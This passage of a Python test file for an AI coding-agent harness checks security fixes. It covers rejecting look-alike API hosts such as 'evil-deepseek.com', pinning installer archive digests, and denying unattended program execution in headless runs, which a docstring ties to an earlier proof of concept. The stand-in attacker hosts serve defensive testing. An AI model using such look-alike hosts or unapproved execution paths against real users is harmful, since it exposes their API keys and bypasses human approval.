        self.assertFalse(doctor._is_deepseek_host("deepseek.com.attacker.example"))

    def test_candidate_bases_do_not_cross_hosts_for_a_look_alike(self) -> None:
        ctx = doctor.DoctorContext.for_config(
            self.make_config(api_base="https://evil-deepseek.com", api_key="sk-x"),
            env={},
            config_path=self.path("config.json"),
            root=ROOT,
            state=self.path("state"),
            workspace=self.workspace_dir,
            sessions_dir=self.path("sessions"),
            network=False,
            persist=False,
        )
        candidates = doctor.candidate_api_bases(ctx)
        self.assertNotIn("https://api.deepseek.com", candidates)
        self.assertNotIn("https://api.deepseek.com/v1", candidates)
        self.assertIn("https://evil-deepseek.com", candidates)


# --------------------------------------------------------------------------------------
# H9 — installer digest pinning
# --------------------------------------------------------------------------------------


class TestInstallerDigest(TempDirTestCase):
    def make_zip(self) -> str:
        path = self.path("app.zip")
        with zipfile.ZipFile(path, "w") as archive:
            archive.writestr("pyto-agent-main/run.py", "print('run')\n")
            archive.writestr("pyto-agent-main/harness/__init__.py", "__version__ = '0.0.1'\n")
        return path

    def run_main(self, *argv):
        import install

        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            try:
                code = install.main(list(argv))
            except SystemExit as exc:  # pragma: no cover - argparse
                code = exc.code
        return code, out.getvalue(), err.getvalue()

    def test_digest_is_printed_and_a_matching_pin_installs(self) -> None:
        import install

        archive = self.make_zip()
        with open(archive, "rb") as handle:
            digest = install.archive_digest(handle.read())
        code, out, err = self.run_main(
            "--zip", archive, "--into", self.path("app"), "--sha256", digest
        )
        self.assertEqual(code, 0, err)
        self.assertIn(digest, out, "the digest must be printed so a user can pin it")

    def test_a_mismatched_pin_refuses_to_install(self) -> None:
        archive = self.make_zip()
        target = self.path("app")
        code, _out, err = self.run_main("--zip", archive, "--into", target, "--sha256", "0" * 64)
        self.assertEqual(code, 1)
        self.assertIn("REFUSING TO INSTALL", err)
        self.assertFalse(os.path.exists(os.path.join(target, "run.py")), "nothing may be written")

    def test_a_malformed_pin_is_a_usage_error(self) -> None:
        archive = self.make_zip()
        code, _out, err = self.run_main("--zip", archive, "--into", self.path("app"), "--sha256", "abc")
        self.assertEqual(code, 2)
        self.assertIn("64 hexadecimal", err)


# --------------------------------------------------------------------------------------
# H10 — unattended runs need a decision
# --------------------------------------------------------------------------------------


class TestUnattendedPrograms(unittest.TestCase):
    def test_run_program_is_denied_when_nothing_can_approve(self) -> None:
        policy = make_policy()
        decision = policy("run_program", {"path_or_source": "print(1)"})
        self.assertFalse(decision.allowed)
        self.assertIn("--allow-unattended-programs", decision.reason)
        # ... while the rest of the AUTO set is unaffected.
        self.assertTrue(policy("read_file", {"path": "a.txt"}).allowed)

    def test_the_explicit_opt_in_allows_it(self) -> None:
        self.assertTrue(make_policy(unattended_programs=True)("run_program", {}).allowed)

    def test_an_interactive_approver_allows_it(self) -> None:
        self.assertTrue(make_policy(prompter=auto_prompter(False))("run_program", {}).allowed)
        self.assertTrue(make_policy(interactive=True)("run_program", {}).allowed)

    def test_yolo_still_allows_it(self) -> None:
        self.assertTrue(make_policy(yolo=True)("run_program", {}).allowed)

    def test_a_terminal_approver_without_a_tty_is_not_interactive(self) -> None:
        from harness.ui import TerminalApprover

        self.assertFalse(prompter_is_interactive(TerminalApprover(interactive=False)))
        self.assertTrue(prompter_is_interactive(TerminalApprover(interactive=True, input_fn=lambda _p: "y")))
        self.assertFalse(prompter_is_interactive(None))

    def test_a_headless_turn_denies_run_program_end_to_end(self) -> None:
        """The Poc 1 path: no prompter, no TTY -- the program must not run."""

        class Case(TempDirTestCase):
            pass

        with MockProvider([text_response("ok")]) as provider:
            import tempfile

            with tempfile.TemporaryDirectory() as tmp:
                case = Case()
                case.tmp = tmp
                case.workspace_dir = os.path.join(tmp, "workspace")
                registry = case.make_registry()
                registry.policy = make_policy()  # headless: no prompter
                session = SessionLog.create(os.path.join(tmp, "s.jsonl"), workspace=case.workspace_dir)
                client = make_client(provider)
                options = make_options(client, registry, session)
                decision = registry.check("run_program", {"path_or_source": "print('should not run')"})
                self.assertFalse(decision.allowed)
                self.assertEqual(registry.invocations.get("run_program"), None)
                client.close()
                session.close()


class TestPrivateWritesTruncate(TempDirTestCase):
    """Regression: a shorter rewrite must not leave the tail of the previous file.

    ``write_private`` opened without ``O_TRUNC``, so shrinking a JSON cache or a spill
    file produced invalid content (old bytes after the new ones).  Found while building
    the one-stop installer, which works around it with ``open_private(truncate=True)``.
    """

    def test_a_shorter_rewrite_leaves_no_tail(self):
        from harness.security import write_private

        path = self.path("cache.json")
        write_private(path, "A" * 4096 + "\n")
        write_private(path, "B" * 10 + "\n")
        with open(path, "r", encoding="utf-8") as handle:
            self.assertEqual(handle.read(), "B" * 10 + "\n")

    def test_the_rewrite_is_still_private(self):
        import stat as stat_module

        from harness.security import write_private

        path = self.path("spill.txt")
        write_private(path, "x" * 100)
        write_private(path, "y")
        self.assertEqual(stat_module.S_IMODE(os.stat(path).st_mode), 0o600)
        with open(path, "r", encoding="utf-8") as handle:
            self.assertEqual(handle.read(), "y")

    def test_bytes_payloads_truncate_too(self):
        from harness.security import write_private

        path = self.path("blob.bin")
        write_private(path, b"\x00" * 100)
        write_private(path, b"ok")
        with open(path, "rb") as handle:
            self.assertEqual(handle.read(), b"ok")

    def test_truncate_can_be_turned_off_explicitly(self):
        from harness.security import write_private

        path = self.path("append-ish.txt")
        write_private(path, "head-")
        write_private(path, "tail", truncate=False)
        with open(path, "r", encoding="utf-8") as handle:
            # Overwrites from offset 0 and keeps the remaining byte: the escape hatch
            # exists, but no caller uses it for a whole-file write.
            self.assertEqual(handle.read(), "tail-")


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
